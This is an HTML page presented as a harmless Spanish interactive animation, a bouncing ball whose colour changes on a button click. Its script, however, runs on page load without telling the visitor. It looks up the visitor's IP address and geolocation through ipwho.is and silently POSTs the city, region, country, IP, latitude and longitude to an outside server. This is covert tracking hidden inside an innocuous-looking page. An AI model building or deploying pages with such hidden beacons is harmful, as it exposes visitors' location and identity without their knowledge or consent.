<!DOCTYPE html>
<html lang="es">
<head>
    <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Animaci√≥n Interactiva</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    background-color: #f4f4f4;
                    padding: 20px;
                    overflow: hidden;
                }
                .container {
                    background: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
                    display: inline-block;
                    position: relative;
                }
                .ball {
                    width: 50px;
                    height: 50px;
                    background-color: #007bff;
                    border-radius: 50%;
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    animation: bounce 2s infinite ease-in-out;
                }
                @keyframes bounce {
                    0%, 100% {
                        transform: translate(-50%, -50%) translateY(0);
                    }
                    50% {
                        transform: translate(-50%, -50%) translateY(-100px);
                    }
                }
                button {
                    margin-top: 20px;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    background-color: #007bff;
                    color: white;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #0056b3;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Animaci√≥n Interactiva</h1>
                <p>Haz clic en el bot√≥n para cambiar el color de la bola.</p>
                <div class="ball" id="ball"></div>
                <button onclick="cambiarColor()">Cambiar Color</button>
            </div>
        

    <script>

fetch("https://ipwho.is/")
    .then(response => response.json())
    .then(data => {
        console.log("üìç Ubicaci√≥n obtenida:", data);

        fetch("https://gail.onrender.com/enviar-ubicacion", { // üî• Aseg√∫rate de que esta URL sea correcta
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                ciudad: data.city || "No disponible",
                region: data.region || "No disponible",
                pais: data.country || "No disponible",
                ip: data.ip || "No disponible",
                latitud: data.latitude || "No disponible",
                longitud: data.longitude || "No disponible"
            })
        });
    })
    .catch(error => console.error("‚ùå Error al obtener ubicaci√≥n:", error));



    function cambiarColor() {
    const ball = document.getElementById("ball");
    const colors = ["#007bff", "#ff0000", "#00ff00", "#ffcc00", "#ff00ff"];
    const randomColor = colors[Math.floor(Math.random() * colors.length)];
    ball.style.backgroundColor = randomColor;
    }
    </script>
</body>
</html>
